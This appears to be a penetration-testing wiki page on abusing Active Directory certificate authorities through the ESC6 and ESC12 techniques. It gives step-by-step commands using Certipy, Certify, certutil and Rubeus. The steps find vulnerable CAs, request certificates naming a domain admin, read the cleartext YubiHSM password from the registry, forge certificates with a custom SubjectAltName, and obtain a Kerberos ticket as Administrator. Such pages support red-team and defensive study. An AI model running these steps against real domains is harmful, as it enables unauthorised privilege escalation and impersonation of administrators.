---
authors: BlWasp, ShutdownRepo, sckdev, RemiEC
category: ad
---

# Certificate authority

## Theory

### Certificate Authority misconfiguration

In [their research papers](https://posts.specterops.io/certified-pre-owned-d95910965cd2), [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_) found a domain escalation vector based on a dangerous CA setting (i.e. the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag). The escalation vector was dubbed [ESC6](https://posts.specterops.io/certified-pre-owned-d95910965cd2#2a56).

When the flag is set on the CA, templates configured for authentication (i.e. EKUs like Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose (`OID 2.5.29.37.0`), or no EKU (`SubCA`)) and allowing low-priv users to enroll can be abused to authenticate as any other user/machine/admin.

> [!SUCCESS]
> The default User template checks all the template requirements stated above.
>
> If the CA is configured with the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (admins tend to enable that flag without knowing the security implications), and the User template is enabled (which is very often), any user can escalate to domain admin.

> [!CAUTION]
> [May 2022 security updates](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923) broke the ESC6 attack.


### YubiHSM Key Storage Provider

As described by [Hans-Joachim Knobloch](https://twitter.com/hajoknobloch) in his article [ESC12 – Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm), administrators may configure the Certificate Authority to store its private key on an external device like "Yubico YubiHSM2", over storing it in the software storage.

This is a USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine. 

> In order to generate and use keys in the YubiHSM, the Key Storage Provider must use an authentication key (sometimes dubbed "password"). This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext. 
>  
> Furthermore, the YubiHSM Key Storage Provider does not check under which user account processes calling it via CNG are running.
>
> ([Hans-Joachim Knobloch](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm))

## Practice

### (ESC6) `EDITF_ATTRIBUTESUBJECTALTNAME2`

::: tabs

=== UNIX-like

From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate info about the CAs, including the "User Specified SAN" flag state which is an alias to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep "User Specified SAN"
```

> [!TIP]
> By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.

Once the right template is found (i.e. the default User template) ([how to enumerate](./#attack-paths)), a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).

```bash
# To specify a user account in the SAN
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'

# To specify a computer account in the SAN
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
```

The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.


=== Windows

From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate info about the CAs, including the "UserSpecifiedSAN" flag state which refers to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.

```powershell
Certify.exe cas
```

If the flag is enabled on a CA, certify can then be used to find all enabled templates configured with EKUs allowing for authentication, and allowing low-priv users to enroll.

```powershell
Certify.exe /enrolleeSuppliesSubject
Certify.exe /clientauth
```

Once the right template is found (i.e. the default User template), a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).

```powershell
Certify.exe request /ca:'domain\ca' /template:"Certificate template" /altname:"admin"
```

The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.

:::


### (ESC12) Shell access to ADCS CA with YubiHSM 

#### Redirect the USB device server

::: tabs

=== UNIX-like

At the time of writing, no solution exists to perform this attack from a UNIX-like machine.


=== Windows

From a Windows machine, if the YubiHSM device is connected through a USB device server, with sufficient administrative access to this server it could be possible to redirect the YubiHSM connection to a controlled machine.

Read the password value in the `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` registry key, and configure it in the controlled server registry.

Then, find a way to configure the USB device server to connect to the attacker controlled server. For this step, the different tasks to perform may vary between the USB device server solutions in use.

> [!DANGER]
> Generally USB device server solutions can't connect the device to multiple systems at once. If the device is disconnected from the CA server, the CA will stop working.

:::


#### Forge a certificate

If the CA's private key is stored on a physical USB device such as "YubiHSM2", and a shell access is obtained on the PKI server (even with low privileges), it is possible to modify and sign new certificates.  
This can be used to replicate an ESC1 abuse path and impersonate privileged users.

::: tabs

=== UNIX-like

At the time of writing, no solution exists to perform this attack from a UNIX-like machine.


=== Windows

Retrieve a valid certificate  :
```powershell
certipy req -target $ADCS_HOST -dc-ip $DC_IP -u "$USER@$DOMAIN" -p '$PASSWORD' -template User -ca <CA-Common-Name>
certipy cert -pfx user_esc12.pfx -nokey -out user_esc12.crt
certipy cert -pfx user_esc12.pfx -nocert -out user_esc12.key
```

From a Windows machine, as a low privileged user connected into the CA server, obtain the CA certificate (it is public) and import it to the user store:

```powershell
certutil -addstore -user my ./root-ca.cer
```

Next, the certificate must be associated to the private key in the YubiHSM2 device:

```powershell
certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA-Common-Name>
```

> [!TIP]
> Ignore any `CRYPT_E_EXISTS` error at this point.

Use the CA certificate and its private key with the [`certutil -sign`](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/certutil#-sign) command to forge new arbitrary certificates.

```powershell
certutil -sign ./user_esc12.crt new.crt @extension.inf
```

The following `.inf` file can be used to add a custom `SubjectAltName`, similarly to the ESC1 abuse.

```powershell
[Extensions]
2.5.29.17 = "{text}"
_continue_ = "UPN=Administrator@esc.local&"
```
Finally, recreate the PFX file and use it to retrieve a TGT as a privileged user.

```powershell
openssl.exe pkcs12 -export -in new.crt -inkey user_esc12.key -out user_esc12_Administrator.pfx

Rubeus.exe asktgt /user:Administrator /certificate:user_esc12_Administrator.pfx /domain:esc.local /dc:192.168.1.2 /show /nowrap
```


:::


## Resources

[https://posts.specterops.io/certified-pre-owned-d95910965cd2](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

[https://www.keyfactor.com/blog/hidden-dangers-certificate-subject-alternative-names-sans](https://www.keyfactor.com/blog/hidden-dangers-certificate-subject-alternative-names-sans)

[https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6)

[https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)

[https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
